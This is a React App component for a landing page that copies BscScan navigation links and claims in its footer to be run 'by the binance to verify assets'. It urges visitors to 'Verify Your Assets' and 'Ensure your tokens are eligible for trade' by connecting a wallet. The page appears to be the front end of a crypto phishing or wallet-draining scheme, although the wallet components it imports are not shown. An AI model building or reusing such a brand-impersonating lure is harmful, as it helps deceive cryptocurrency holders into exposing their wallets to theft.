import React, { useState } from "react";
import "./App.css";
import ConnectWallet from "./Components/ConnectWallet";
import WalletDetails from "./Components/WalletDetails";

const App = ({ web3 }) => {
  const [menuOpens, setMenuOpens] = useState(false);
  const [isWallet, setIsWallet] = useState(false);

  return (
    <div className="landing-container ">
      <WalletDetails
          checkStatus={isWallet}
          details={setIsWallet}
          web3={web3}
        />
      <nav className="navbar">
        
        <div className="logo">
          <img src="/images/logo2.png" alt="BNB Logo" />
        </div>
        <ul className={`nav-links ${menuOpens ? "active" : ""}`}>
          <li>
            <a
              href="https://bscscan.com/"
              target="_blank"
              rel="noopener noreferrer"
            >
              Home
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/txs"
              target="_blank"
              rel="noopener noreferrer"
            >
              Blockchain
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/tokens"
              target="_blank"
              rel="noopener noreferrer"
            >
              Tokens
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/validators"
              target="_blank"
              rel="noopener noreferrer"
            >
              Validators
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/nft-top-contracts"
              target="_blank"
              rel="noopener noreferrer"
            >
              NFTs
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/charts"
              target="_blank"
              rel="noopener noreferrer"
            >
              Resources
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/verifyContract"
              target="_blank"
              rel="noopener noreferrer"
            >
              Developers
            </a>
          </li>
        </ul>
        <div
          className={`hamburger ${menuOpens ? "open" : ""}`}
          onClick={() => setMenuOpens(!menuOpens)}
        >
          <span></span>
          <span></span>
          <span></span>
        </div>
      </nav>
      <main className="hero">
        <h1>Verify Your Assets</h1>
        <p>Ensure your tokens are eligible for trade.</p>
        <div className="tnShado">
          <ConnectWallet data={setIsWallet} web3={web3} />
        </div>
      </main>
      <footer className="footer">
        © 2025 Best application Reserved by the binance to verify assets.
      </footer>
    </div>
  );
};

export default App;
